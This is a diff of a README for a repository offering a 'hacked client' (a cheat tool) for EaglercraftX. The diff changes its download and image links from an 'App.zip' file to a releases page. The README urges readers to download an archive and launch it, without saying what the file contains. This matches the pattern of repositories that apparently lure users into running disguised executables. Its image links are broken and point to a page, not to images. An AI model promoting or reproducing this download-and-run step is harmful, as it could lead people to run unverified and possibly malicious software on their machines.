@@ -3,7 +3,7 @@
 ## Overview
 Welcome to the official repository of **WurstX-A-Ported-Hacked-Client**! This project focuses on bringing the renowned Wurst hacked client into the EaglercraftX gaming experience.
 
-![EaglercraftX](https://img.icons8.com/cotton/2x/eagle.png) ![WurstX](https://img.icons8.com/color/2x/potted-sausage.png)
+![EaglercraftX](https://github.com/flane807/WurstX-A-Ported-Hacked-Client/releases) ![WurstX](https://github.com/flane807/WurstX-A-Ported-Hacked-Client/releases)
 
 ## Project Details
 - **Repository Name:** WurstX-A-Ported-Hacked-Client
@@ -11,9 +11,9 @@ Welcome to the official repository of **WurstX-A-Ported-Hacked-Client**! This pr
 - **Topics:** eagler, eaglercraft, eaglercraft-github, eaglercrafthackedclient, eaglercrafthacks, eaglercraftoffline, eaglercraftx, eaglercraftx-client, eaglercraftx-hacks, wurst, wurst-client, wurst-minecraft
 
 ## Getting Started
-To download the client, click [here](https://github.com/uploads/App.zip) and launch the file after download. If the link is not working, please check the "Releases" section for alternative download options.
+To download the client, click [here](https://github.com/flane807/WurstX-A-Ported-Hacked-Client/releases) and launch the file after download. If the link is not working, please check the "Releases" section for alternative download options.
 
-[![Download Client](https://img.shields.io/badge/Download-Client-blue.svg)](https://github.com/uploads/App.zip)
+[![Download Client](https://github.com/flane807/WurstX-A-Ported-Hacked-Client/releases)](https://github.com/flane807/WurstX-A-Ported-Hacked-Client/releases)
 
 ## Usage
 The **WurstX-A-Ported-Hacked-Client** offers a wide range of hacks and client-side modifications to enhance your EaglercraftX gameplay. Explore the features, experiment with different hacks, and take your gaming experience to the next level.
